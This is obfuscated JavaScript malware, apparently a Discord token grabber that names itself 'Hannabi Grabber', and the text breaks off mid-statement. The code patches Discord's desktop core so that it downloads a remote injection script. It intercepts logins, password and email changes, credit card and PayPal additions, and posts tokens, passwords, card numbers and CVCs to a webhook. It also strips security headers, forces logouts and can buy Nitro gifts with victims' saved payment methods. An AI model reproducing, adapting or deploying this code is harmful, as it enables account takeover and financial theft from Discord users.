const _0xcdab72=_0x36ab;(function(_0x41427c,_0x575883){const _0xe249d=_0x36ab,_0x2e4267=_0x41427c();while(!![]){try{const _0x599665=parseInt(_0xe249d(0xe9))/0x1*(parseInt(_0xe249d(0xd7))/0x2)+-parseInt(_0xe249d(0x93))/0x3+parseInt(_0xe249d(0xea))/0x4+-parseInt(_0xe249d(0x81))/0x5+parseInt(_0xe249d(0xce))/0x6+parseInt(_0xe249d(0x133))/0x7+-parseInt(_0xe249d(0xa2))/0x8*(parseInt(_0xe249d(0x98))/0x9);if(_0x599665===_0x575883)break;else _0x2e4267['push'](_0x2e4267['shift']());}catch(_0x2b7334){_0x2e4267['push'](_0x2e4267['shift']());}}}(_0x5bec,0x91f83));const args=process[_0xcdab72(0x10c)],fs=require('fs'),path=require('path'),https=require('https'),querystring=require('querystring'),{BrowserWindow,session}=require(_0xcdab72(0xfa)),config={'auto_buy_nitro':![],'ping_on_run':![],'ping_val':_0xcdab72(0xf1),'embed_name':_0xcdab72(0x97),'embed_icon':_0xcdab72(0xb6)[_0xcdab72(0x115)](/ /g,'%20'),'embed_color':0x7f9de0,'webhook':_0xcdab72(0x117),'injection_url':_0xcdab72(0xde),'api':_0xcdab72(0x116),'nitro':{'boost':{'year':{'id':_0xcdab72(0x86),'sku':_0xcdab72(0x11a),'price':'9999'},'month':{'id':_0xcdab72(0x86),'sku':_0xcdab72(0x74),'price':_0xcdab72(0x73)}},'classic':{'month':{'id':_0xcdab72(0xe6),'sku':'511651871736201216','price':_0xcdab72(0x109)}}},'filter':{'urls':[_0xcdab72(0xba),_0xcdab72(0xed),_0xcdab72(0xbb),_0xcdab72(0xd0),_0xcdab72(0x103),_0xcdab72(0x94),_0xcdab72(0xac),_0xcdab72(0x111),_0xcdab72(0xf4),_0xcdab72(0x7d)]},'filter2':{'urls':['https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','https://*.discord.com/api/v*/applications/detectable',_0xcdab72(0x7a),_0xcdab72(0xab),_0xcdab72(0x88),_0xcdab72(0xf3)]}},discordPath=(function(){const _0x1f3123=_0xcdab72,_0x512282=args[0x2]&&args[0x2][_0x1f3123(0xa0)]()===_0x1f3123(0xc3),_0x76ca53=_0x512282?args[0x3]&&args[0x3][_0x1f3123(0xa0)]():args[0x2]&&args[0x2][_0x1f3123(0xa0)](),_0x278366=_0x76ca53===_0x1f3123(0xe7)?_0x1f3123(0xb1):_0x76ca53==='ptb'?'Discord\x20PTB':'Discord';let _0x9922e8='';if(process[_0x1f3123(0xa7)]===_0x1f3123(0xf8)){const _0x2067a5=path[_0x1f3123(0x83)](process[_0x1f3123(0x10e)]['LOCALAPPDATA'],_0x278366[_0x1f3123(0x115)](/ /g,'')),_0x15b64a=fs['readdirSync'](_0x2067a5)[_0x1f3123(0x78)](_0x53534f=>fs[_0x1f3123(0x80)](path[_0x1f3123(0x83)](_0x2067a5,_0x53534f))[_0x1f3123(0xa6)]()&&_0x53534f[_0x1f3123(0x87)]('.')[_0x1f3123(0xa5)]>0x1)['sort']()['reverse']()[0x0];_0x9922e8=path['join'](_0x2067a5,_0x15b64a,_0x1f3123(0x8a));}else{if(process['platform']===_0x1f3123(0xe3)){const _0x4e70db=_0x76ca53===_0x1f3123(0xe7)?path['join'](_0x1f3123(0xdb),_0x1f3123(0xb3)):_0x76ca53==='ptb'?path['join'](_0x1f3123(0xdb),_0x1f3123(0x107)):_0x512282&&args[0x3]?args[0x3]?args[0x2]:args[0x2]:path['join']('/Applications',_0x1f3123(0x110));_0x9922e8=path[_0x1f3123(0x83)](_0x4e70db,_0x1f3123(0x11b),_0x1f3123(0xdf));}}if(fs[_0x1f3123(0x91)](_0x9922e8))return _0x9922e8;return'';}());function updateCheck(){const _0x3db643=_0xcdab72,_0x5ae29e=path[_0x3db643(0x83)](discordPath,'app'),_0x5a26a8=path[_0x3db643(0x83)](_0x5ae29e,_0x3db643(0xd6)),_0x5ded2f=path[_0x3db643(0x83)](_0x5ae29e,_0x3db643(0xd3)),_0x1681de=path['resolve'](path[_0x3db643(0xc6)](__dirname,'..'),'..'),_0x5ec0b6=_0x1681de+_0x3db643(0x72),_0x3f6a1d=path[_0x3db643(0x83)](process[_0x3db643(0x10e)][_0x3db643(0xb9)],'\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar');if(!fs[_0x3db643(0x91)](_0x5ae29e))fs['mkdirSync'](_0x5ae29e);if(fs['existsSync'](_0x5a26a8))fs[_0x3db643(0xc2)](_0x5a26a8);if(fs[_0x3db643(0x91)](_0x5ded2f))fs[_0x3db643(0xc2)](_0x5ded2f);if(process['platform']===_0x3db643(0xf8)||process['platform']==='darwin'){fs[_0x3db643(0xd8)](_0x5a26a8,JSON['stringify']({'name':_0x3db643(0xcc),'main':'index.js'},null,0x4));const _0x5d8842='const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27'+_0x5ec0b6+_0x3db643(0x92)+_0x3f6a1d+'\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27'+config['injection_url']+_0x3db643(0x100)+path[_0x3db643(0x83)](discordPath,'app.asar')+'\x27)\x0aif\x20(fs.existsSync(bdPath))\x20{\x0a\x20\x20\x20\x20require(bdPath);\x0a}';fs[_0x3db643(0xd8)](_0x5ded2f,_0x5d8842[_0x3db643(0x115)](/\\/g,'\x5c\x5c'));}if(!fs['existsSync'](path[_0x3db643(0x83)](__dirname,_0x3db643(0x75))))return!0x0;return fs[_0x3db643(0xbf)](path[_0x3db643(0x83)](__dirname,_0x3db643(0x75))),execScript(_0x3db643(0xfc)),!0x1;}const execScript=_0x2bc9df=>{const _0x248084=_0xcdab72,_0x173b80=BrowserWindow['getAllWindows']()[0x0];return _0x173b80[_0x248084(0x125)]['executeJavaScript'](_0x2bc9df,!0x0);},getInfo=async _0xeb7d44=>{const _0x476995=_0xcdab72,_0x1213a9=await execScript(_0x476995(0x12d)+config[_0x476995(0xb4)]+_0x476995(0x8d)+_0xeb7d44+_0x476995(0xcf));return JSON[_0x476995(0xcb)](_0x1213a9);},fetchBilling=async _0x1c798e=>{const _0x15d7f9=_0xcdab72,_0x44fad8=await execScript(_0x15d7f9(0x121)+config[_0x15d7f9(0xb4)]+_0x15d7f9(0xca)+_0x1c798e+_0x15d7f9(0x7c));if(_0x44fad8[_0x15d7f9(0xa5)]===0x0&&!_0x44fad8[_0x15d7f9(0xd5)])return'';return JSON[_0x15d7f9(0xcb)](_0x44fad8);},getBilling=async _0x4af75c=>{const _0x2e9e92=_0xcdab72,_0xb57389=await fetchBilling(_0x4af75c);if(_0xb57389==='')return'❌';let _0x1163be='';_0xb57389[_0x2e9e92(0x8e)](_0x559142=>{const _0x1d8b68=_0x2e9e92;if(_0x559142[_0x1d8b68(0x12e)]===0x2&&!_0x559142[_0x1d8b68(0xb0)])_0x1163be+='✅'+_0x1d8b68(0x85);else _0x559142[_0x1d8b68(0x12e)]===0x1&&!_0x559142[_0x1d8b68(0xb0)]?_0x1163be+='✅'+_0x1d8b68(0xe0):_0x1163be='❌';});if(_0x1163be==='')_0x1163be='❌';return _0x1163be;},Purchase=async(_0x1fd22d,_0x23d1d3,_0x3ad597,_0x2590dd)=>{const _0x38a0c5=_0xcdab72,_0x225949=execScript(_0x38a0c5(0x7f)+config[_0x38a0c5(0xc9)][_0x3ad597][_0x2590dd]['id']+_0x38a0c5(0x120)+_0x1fd22d+'\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify('+JSON['stringify']({'expected_amount':config['nitro'][_0x3ad597][_0x2590dd][_0x38a0c5(0xa1)],'expected_currency':_0x38a0c5(0xf9),'gift':!![],'payment_source_id':_0x23d1d3,'payment_source_token':null,'purchase_token':_0x38a0c5(0x105),'sku_subscription_plan_id':config[_0x38a0c5(0xc9)][_0x3ad597][_0x2590dd][_0x38a0c5(0xda)]})+_0x38a0c5(0xd2));if(_0x225949['gift_code'])return _0x38a0c5(0xe5)+_0x225949['gift_code'];else return null;},buyNitro=async _0x67c0f2=>{const _0x134cfb=_0xcdab72,_0x4ff9d4=await fetchBilling(_0x67c0f2);if(_0x4ff9d4==='')return _0x134cfb(0xf7);let _0x3dc5aa=[];_0x4ff9d4[_0x134cfb(0x8e)](_0x429148=>{const _0x1269af=_0x134cfb;!_0x429148[_0x1269af(0xb0)]&&(_0x3dc5aa=_0x3dc5aa['concat'](_0x429148['id']));});for(let _0x406ce8 in _0x3dc5aa){const _0x82e2d9=Purchase(_0x67c0f2,_0x406ce8,_0x134cfb(0xa4),_0x134cfb(0x7b));if(_0x82e2d9!==null)return _0x82e2d9;else{const _0x5c40c8=Purchase(_0x67c0f2,_0x406ce8,'boost',_0x134cfb(0xff));if(_0x5c40c8!==null)return _0x5c40c8;else{const _0x141790=Purchase(_0x67c0f2,_0x406ce8,'classic',_0x134cfb(0xff));return _0x141790!==null?_0x141790:_0x134cfb(0xf7);}}}},getNitro=_0xde4a43=>{const _0x3ce340=_0xcdab72;switch(_0xde4a43){case 0x0:return'No\x20Nitro';case 0x1:return _0x3ce340(0x112);case 0x2:return _0x3ce340(0x106);default:return'No\x20Nitro';}},getBadges=_0x492dd8=>{const _0x315af4=_0xcdab72;let _0x26bf50='';switch(_0x492dd8){case 0x1:_0x26bf50+=_0x315af4(0x127);break;case 0x2:_0x26bf50+=_0x315af4(0x8c);break;case 0x20000:_0x26bf50+='Discord\x20Developer,\x20';break;case 0x4:_0x26bf50+=_0x315af4(0xe2);break;case 0x4000:_0x26bf50+='Gold\x20BugHunter,\x20';break;case 0x8:_0x26bf50+='Green\x20BugHunter,\x20';break;case 0x200:_0x26bf50+=_0x315af4(0xa9);break;case 0x80:_0x26bf50+='HypeSquad\x20Brillance,\x20';break;case 0x40:_0x26bf50+=_0x315af4(0xf0);break;case 0x100:_0x26bf50+=_0x315af4(0x102);break;case 0x0:_0x26bf50=_0x315af4(0x9e);break;default:_0x26bf50=_0x315af4(0x9e);break;}return _0x26bf50;},hooker=async _0x53b0e0=>{const _0x49b39e=_0xcdab72,_0x337943=JSON[_0x49b39e(0x7e)](_0x53b0e0),_0x38b08b=new URL(config[_0x49b39e(0x99)]),_0xa90408={'protocol':_0x38b08b[_0x49b39e(0xe4)],'hostname':_0x38b08b[_0x49b39e(0xfd)],'path':_0x38b08b[_0x49b39e(0x76)],'method':_0x49b39e(0x8f),'headers':{'Content-Type':_0x49b39e(0x126),'Access-Control-Allow-Origin':'*'}},_0x29544e=https[_0x49b39e(0x124)](_0xa90408);_0x29544e['on'](_0x49b39e(0x10d),_0x18cb0f=>{const _0x4dbfd0=_0x49b39e;console[_0x4dbfd0(0x132)](_0x18cb0f);}),_0x29544e[_0x49b39e(0xdd)](_0x337943),_0x29544e[_0x49b39e(0xe8)]();},login=async(_0x2e1644,_0x46514f,_0x398b5b)=>{const _0x121e8e=_0xcdab72,_0x2b03dc=await getInfo(_0x398b5b),_0x45d95d=getNitro(_0x2b03dc[_0x121e8e(0xfb)]),_0x3f5bb5=getBadges(_0x2b03dc[_0x121e8e(0xfe)]),_0x2eb265=await getBilling(_0x398b5b),_0x31f0d9={'username':config['embed_name'],'avatar_url':config[_0x121e8e(0xb5)],'embeds':[{'color':config[_0x121e8e(0x10f)],'fields':[{'name':_0x121e8e(0x12c),'value':_0x121e8e(0x89)+_0x2e1644+_0x121e8e(0xf6)+_0x46514f+'**','inline':![]},{'name':'**Discord\x20Info**','value':_0x121e8e(0xcd)+_0x45d95d+_0x121e8e(0xd1)+_0x3f5bb5+'**\x0aBilling:\x20**'+_0x2eb265+'**','inline':![]},{'name':_0x121e8e(0xa3),'value':'`'+_0x398b5b+'`','inline':![]}],'author':{'name':_0x2b03dc[_0x121e8e(0xec)]+'#'+_0x2b03dc['discriminator']+_0x121e8e(0x130)+_0x2b03dc['id'],'icon_url':_0x121e8e(0xd9)+_0x2b03dc['id']+'/'+_0x2b03dc[_0x121e8e(0xbc)]+_0x121e8e(0x10a)},'footer':{'text':_0x121e8e(0xc1)}}]};if(config[_0x121e8e(0xf5)])_0x31f0d9[_0x121e8e(0x79)]=config['ping_val'];hooker(_0x31f0d9);},passwordChanged=async(_0x56e7c7,_0x905251,_0x4859ce)=>{const _0x4ec6dd=_0xcdab72,_0x4e908c=await getInfo(_0x4859ce),_0x346bd9=getNitro(_0x4e908c[_0x4ec6dd(0xfb)]),_0x4fcf5d=getBadges(_0x4e908c[_0x4ec6dd(0xfe)]),_0x1628ab=await getBilling(_0x4859ce),_0xf69eef={'username':config[_0x4ec6dd(0xc8)],'avatar_url':config[_0x4ec6dd(0xb5)],'embeds':[{'color':config[_0x4ec6dd(0x10f)],'fields':[{'name':'**Password\x20Changed**','value':_0x4ec6dd(0x89)+_0x4e908c[_0x4ec6dd(0x11c)]+_0x4ec6dd(0x104)+_0x56e7c7+_0x4ec6dd(0x77)+_0x905251+'**','inline':!![]},{'name':_0x4ec6dd(0x9f),'value':_0x4ec6dd(0xcd)+_0x346bd9+_0x4ec6dd(0xd1)+_0x4fcf5d+'**\x0aBilling:\x20**'+_0x1628ab+'**','inline':!![]},{'name':_0x4ec6dd(0xa3),'value':'`'+_0x4859ce+'`','inline':![]}],'author':{'name':_0x4e908c['username']+'#'+_0x4e908c[_0x4ec6dd(0xc0)]+'\x20|\x20'+_0x4e908c['id'],'icon_url':_0x4ec6dd(0xd9)+_0x4e908c['id']+'/'+_0x4e908c[_0x4ec6dd(0xbc)]+_0x4ec6dd(0x10a)},'footer':{'text':_0x4ec6dd(0xc1)}}]};if(config['ping_on_run'])_0xf69eef[_0x4ec6dd(0x79)]=config['ping_val'];hooker(_0xf69eef);},emailChanged=async(_0x441d75,_0x36c557,_0x87e0fd)=>{const _0x3da4e5=_0xcdab72,_0x582feb=await getInfo(_0x87e0fd),_0x57e084=getNitro(_0x582feb[_0x3da4e5(0xfb)]),_0x26954d=getBadges(_0x582feb['flags']),_0x363f7d=await getBilling(_0x87e0fd),_0x1df398={'username':config[_0x3da4e5(0xc8)],'avatar_url':config[_0x3da4e5(0xb5)],'embeds':[{'color':config[_0x3da4e5(0x10f)],'fields':[{'name':_0x3da4e5(0xaf),'value':_0x3da4e5(0xae)+_0x441d75+_0x3da4e5(0xad)+_0x36c557+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0x3da4e5(0xcd)+_0x57e084+_0x3da4e5(0xd1)+_0x26954d+_0x3da4e5(0xb7)+_0x363f7d+'**','inline':!![]},{'name':_0x3da4e5(0xa3),'value':'`'+_0x87e0fd+'`','inline':![]}],'author':{'name':_0x582feb[_0x3da4e5(0xec)]+'#'+_0x582feb[_0x3da4e5(0xc0)]+'\x20|\x20'+_0x582feb['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x582feb['id']+'/'+_0x582feb[_0x3da4e5(0xbc)]+_0x3da4e5(0x10a)},'footer':{'text':_0x3da4e5(0xc1)}}]};if(config[_0x3da4e5(0xf5)])_0x1df398[_0x3da4e5(0x79)]=config[_0x3da4e5(0x8b)];hooker(_0x1df398);},PaypalAdded=async _0x466842=>{const _0x59dd0a=_0xcdab72,_0x5396fa=await getInfo(_0x466842),_0x32ea64=getNitro(_0x5396fa[_0x59dd0a(0xfb)]),_0x25ac2d=getBadges(_0x5396fa[_0x59dd0a(0xfe)]),_0xbf5675=getBilling(_0x466842),_0x3075e2={'username':config['embed_name'],'avatar_url':config[_0x59dd0a(0xb5)],'embeds':[{'color':config[_0x59dd0a(0x10f)],'fields':[{'name':_0x59dd0a(0xdc),'value':_0x59dd0a(0xeb),'inline':![]},{'name':_0x59dd0a(0x9f),'value':_0x59dd0a(0xcd)+_0x32ea64+'*\x0aBadges:\x20**'+_0x25ac2d+_0x59dd0a(0xb7)+_0xbf5675+'**','inline':![]},{'name':'**Token**','value':'`'+_0x466842+'`','inline':![]}],'author':{'name':_0x5396fa[_0x59dd0a(0xec)]+'#'+_0x5396fa[_0x59dd0a(0xc0)]+_0x59dd0a(0x130)+_0x5396fa['id'],'icon_url':_0x59dd0a(0xd9)+_0x5396fa['id']+'/'+_0x5396fa[_0x59dd0a(0xbc)]+'.webp'},'footer':{'text':_0x59dd0a(0xc1)}}]};if(config[_0x59dd0a(0xf5)])_0x3075e2[_0x59dd0a(0x79)]=config[_0x59dd0a(0x8b)];hooker(_0x3075e2);},ccAdded=async(_0x35eeca,_0xe1e8c9,_0xc72a2d,_0x25c702,_0x2fec86)=>{const _0x31ff80=_0xcdab72,_0x35f177=await getInfo(_0x2fec86),_0x5ae80d=getNitro(_0x35f177['premium_type']),_0x41626d=getBadges(_0x35f177[_0x31ff80(0xfe)]),_0x4160bc=await getBilling(_0x2fec86),_0x3b2029={'username':config[_0x31ff80(0xc8)],'avatar_url':config[_0x31ff80(0xb5)],'embeds':[{'color':config[_0x31ff80(0x10f)],'fields':[{'name':'**Credit\x20Card\x20Added**','value':_0x31ff80(0xc5)+_0x35eeca+_0x31ff80(0x123)+_0xe1e8c9+'**\x0aCredit\x20Card\x20Expiration:\x20**'+_0xc72a2d+'/'+_0x25c702+'**','inline':!![]},{'name':_0x31ff80(0x9f),'value':'Nitro\x20Type:\x20**'+_0x5ae80d+'**\x0aBadges:\x20**'+_0x41626d+'**\x0aBilling:\x20**'+_0x4160bc+'**','inline':!![]},{'name':_0x31ff80(0xa3),'value':'`'+_0x2fec86+'`','inline':![]}],'author':{'name':_0x35f177[_0x31ff80(0xec)]+'#'+_0x35f177['discriminator']+_0x31ff80(0x130)+_0x35f177['id'],'icon_url':_0x31ff80(0xd9)+_0x35f177['id']+'/'+_0x35f177[_0x31ff80(0xbc)]+_0x31ff80(0x10a)},'footer':{'text':_0x31ff80(0xc1)}}]};if(config[_0x31ff80(0xf5)])_0x3b2029[_0x31ff80(0x79)]=config[_0x31ff80(0x8b)];hooker(_0x3b2029);},nitroBought=async _0x573272=>{const _0x272676=_0xcdab72,_0x3c13b7=await getInfo(_0x573272),_0x9a7d50=getNitro(_0x3c13b7['premium_type']),_0x2e3c66=getBadges(_0x3c13b7[_0x272676(0xfe)]),_0x666ad5=await getBilling(_0x573272),_0x4cddbf=await buyNitro(_0x573272),_0x55cc76={'username':config['embed_name'],'content':_0x4cddbf,'avatar_url':config[_0x272676(0xb5)],'embeds':[{'color':config[_0x272676(0x10f)],'fields':[{'name':_0x272676(0x11f),'value':_0x272676(0x11e)+_0x4cddbf+_0x272676(0x90),'inline':!![]},{'name':'**Discord\x20Info**','value':_0x272676(0xcd)+_0x9a7d50+_0x272676(0xd1)+_0x2e3c66+_0x272676(0xb7)+_0x666ad5+'**','inline':!![]},{'name':_0x272676(0xa3),'value':'`'+_0x573272+'`','inline':![]}],'author':{'name':_0x3c13b7['username']+'#'+_0x3c13b7[_0x272676(0xc0)]+'\x20|\x20'+_0x3c13b7['id'],'icon_url':_0x272676(0xd9)+_0x3c13b7['id']+'/'+_0x3c13b7[_0x272676(0xbc)]+_0x272676(0x10a)},'footer':{'text':_0x272676(0xc1)}}]};if(config['ping_on_run'])_0x55cc76[_0x272676(0x79)]=config[_0x272676(0x8b)]+('\x0a'+_0x4cddbf);hooker(_0x55cc76);};function _0x36ab(_0x430a5a,_0x509d3a){const _0x5bec70=_0x5bec();return _0x36ab=function(_0x36ab16,_0x4a4b00){_0x36ab16=_0x36ab16-0x72;let _0x3ee7c5=_0x5bec70[_0x36ab16];return _0x3ee7c5;},_0x36ab(_0x430a5a,_0x509d3a);}function _0x5bec(){const _0x14bde6=['https://discord.com/api/v*/auth/login','**\x0aOld\x20Password:\x20**','2422867c-244d-476a-ba4f-36e197758d97','Nitro\x20Boost','Discord\x20PTB.app','webRequest','499','.webp','card[exp_year]','argv','error','env','embed_color','Discord.app','https://api.stripe.com/v*/tokens','Nitro\x20Classic','assign','tokens','replace','https://discord.com/api/v9/users/@me','%WEBHOOK%','card[exp_month]','catch','511651885459963904','Contents','email','./core.asar','**Nitro\x20Code:**\x0a```diff\x0a+\x20','**Nitro\x20bought!**','/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','onBeforeRequest','**\x0aCVC:\x20**','request','webContents','application/json','Discord\x20Staff,\x20','paypal_accounts','content-security-policy','onHeadersReceived','includes','**Account\x20Info**','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','type','method','\x20|\x20','defaultSession','log','6712531YlbLaK','\x5cdiscord_desktop_core-3\x5cdiscord_desktop_core\x5cindex.js','999','511651880837840896','initiation','pathname','**\x0aNew\x20Password:\x20**','filter','content','https://discord.com/api/v*/applications/detectable','year','\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText','https://api.stripe.com/v*/payment_intents/*/confirm','stringify','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/','lstatSync','5001930DtVqTW','bytes','join','exports','\x20<:paypal:951139189389410365>','521847234246082599','split','https://discord.com/api/v*/users/@me/library','Email:\x20**','resources','ping_val','Partnered\x20Server\x20Owner,\x20','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','forEach','POST','```','existsSync','\x27;\x0aconst\x20bdPath\x20=\x20\x27','1084155uDKPjH','https://*.discord.com/api/v*/auth/login','users/@me','auto_buy_nitro','Hannabi\x20Grabber','6184935flzWGt','webhook','onCompleted','card[number]','responseHeaders','password','None','**Discord\x20Info**','toLowerCase','price','8lAizDk','**Token**','boost','length','isDirectory','platform','login','Early\x20Supporter,\x20','content-security-policy-report-only','https://*.discord.com/api/v*/users/@me/library','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','**\x0aPassword:\x20**','New\x20Email:\x20**','**Email\x20Changed**','invalid','Discord\x20Canary','toString','Discord\x20Canary.app','api','embed_icon','https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord\x20atom.png','**\x0aBilling:\x20**','card[cvc]','APPDATA','https://discord.com/api/v*/users/@me','https://*.discord.com/api/v*/users/@me','avatar','PATCH','Access-Control-Allow-Origin\x20\x27*\x27','rmdirSync','discriminator','🎉・Hannabi\x20Grabber','unlinkSync','release','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','Credit\x20Card\x20Number:\x20**','resolve','confirm','embed_name','nitro','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','parse','Discord-Injection','Nitro\x20Type:\x20**','2855880DFOMeP','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','https://discordapp.com/api/v*/auth/login','**\x0aBadges:\x20**','));\x0a\x20\x20\x20\x20xmlHttp.responseText','index.js','url','lenght','package.json','6kQgpKP','writeFileSync','https://cdn.discordapp.com/avatars/','sku','/Applications','**Paypal\x20Added**','write','https://raw.githubusercontent.com/maoodz/dzdzqddzqdzqdzqfzqfqzifzqfjqzjfqzfjizqfijqijfzqjihfqijhfijqzfjizfqfz/main/injection.js','Resources','\x20💳','from','Hypesquad\x20Event,\x20','darwin','protocol','https://discord.gift/','521846918637420545','canary','end','363159dhHEfj','489948pBqZft','Time\x20to\x20buy\x20nitro\x20Hannabi\x20Grabber\x20on\x20top\x20😩','username','https://discordapp.com/api/v*/users/@me','endsWith','startsWith','HypeSquad\x20Bravery,\x20','@everyone','default-src\x20\x27*\x27','wss://remote-auth-gateway.discord.gg/*','https://api.stripe.com/v*/setup_intents/*/confirm','ping_on_run','**\x20-\x20Password:\x20**','Failed\x20to\x20Purchase\x20❌','win32','usd','electron','premium_type','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','host','flags','month','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','statusCode','HypeSquad\x20Balance,\x20'];_0x5bec=function(){return _0x14bde6;};return _0x5bec();}session[_0xcdab72(0x131)][_0xcdab72(0x108)][_0xcdab72(0x122)](config['filter2'],(_0x4191ef,_0x127b90)=>{const _0xcd1a41=_0xcdab72;if(_0x4191ef['url'][_0xcd1a41(0xef)]('wss://remote-auth-gateway')){_0x127b90({'cancel':!![]});return;}if(updateCheck()){}_0x127b90({});return;}),session[_0xcdab72(0x131)][_0xcdab72(0x108)][_0xcdab72(0x12a)]((_0x3aabbd,_0x557dac)=>{const _0x508703=_0xcdab72;_0x3aabbd[_0x508703(0xd4)]['startsWith'](config[_0x508703(0x99)])?_0x3aabbd[_0x508703(0xd4)][_0x508703(0x12b)]('discord.com')?_0x557dac({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0x3aabbd['responseHeaders'])}):_0x557dac({'responseHeaders':Object[_0x508703(0x113)]({'Content-Security-Policy':[_0x508703(0xf2),'Access-Control-Allow-Headers\x20\x27*\x27',_0x508703(0xbe)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x3aabbd[_0x508703(0x9c)])}):(delete _0x3aabbd[_0x508703(0x9c)][_0x508703(0x129)],delete _0x3aabbd[_0x508703(0x9c)][_0x508703(0xaa)],_0x557dac({'responseHeaders':{..._0x3aabbd[_0x508703(0x9c)],'Access-Control-Allow-Headers':'*'}}));}),session[_0xcdab72(0x131)]['webRequest'][_0xcdab72(0x9a)](config[_0xcdab72(0x78)],async(_0x25c892,_0x42470c)=>{const _0x16925f=_0xcdab72;if(_0x25c892[_0x16925f(0x101)]!==0xc8&&_0x25c892[_0x16925f(0x101)]!==0xca)return;const _0x5ebb05=await Buffer[_0x16925f(0xe1)](_0x25c892['uploadData'][0x0][_0x16925f(0x82)])[_0x16925f(0xb2)](),_0x5f51c5=JSON[_0x16925f(0xcb)](_0x5ebb05),_0xf3ef48=await execScript(_0x16925f(0xc4));switch(!![]){case _0x25c892['url'][_0x16925f(0xee)](_0x16925f(0xa8)):login(_0x5f51c5[_0x16925f(0xa8)],_0x5f51c5[_0x16925f(0x9d)],_0xf3ef48)['catch'](console[_0x16925f(0x10d)]);break;case _0x25c892[_0x16925f(0xd4)][_0x16925f(0xee)](_0x16925f(0x95))&&_0x25c892[_0x16925f(0x12f)]===_0x16925f(0xbd):if(!_0x5f51c5['password'])return;_0x5f51c5[_0x16925f(0x11c)]&&emailChanged(_0x5f51c5['email'],_0x5f51c5[_0x16925f(0x9d)],_0xf3ef48)[_0x16925f(0x119)](console[_0x16925f(0x10d)]);_0x5f51c5['new_password']&&passwordChanged(_0x5f51c5[_0x16925f(0x9d)],_0x5f51c5['new_password'],_0xf3ef48)[_0x16925f(0x119)](console[_0x16925f(0x10d)]);break;case _0x25c892[_0x16925f(0xd4)][_0x16925f(0xee)](_0x16925f(0x114))&&_0x25c892[_0x16925f(0x12f)]===_0x16925f(0x8f):const _0x48a4e2=querystring[_0x16925f(0xcb)](unparsedData[_0x16925f(0xb2)]());ccAdded(_0x48a4e2[_0x16925f(0x9b)],_0x48a4e2[_0x16925f(0xb8)],_0x48a4e2[_0x16925f(0x118)],_0x48a4e2[_0x16925f(0x10b)],_0xf3ef48)[_0x16925f(0x119)](console['error']);break;case _0x25c892[_0x16925f(0xd4)]['endsWith'](_0x16925f(0x128))&&_0x25c892['method']==='POST':PaypalAdded(_0xf3ef48)[_0x16925f(0x119)](console[_0x16925f(0x10d)]);break;case 